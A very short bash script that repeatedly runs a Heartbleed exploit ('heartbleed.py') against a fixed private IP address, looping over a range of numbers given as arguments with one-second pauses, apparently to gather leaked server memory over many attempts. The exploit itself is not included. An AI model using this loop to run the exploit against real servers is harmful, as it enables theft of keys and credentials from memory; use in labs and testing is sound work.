#!/bin/bash


for i in $(eval echo {$1..$2})
do

sleep 1 

python heartbleed.py 10.176.147.83 
sleep 1

done
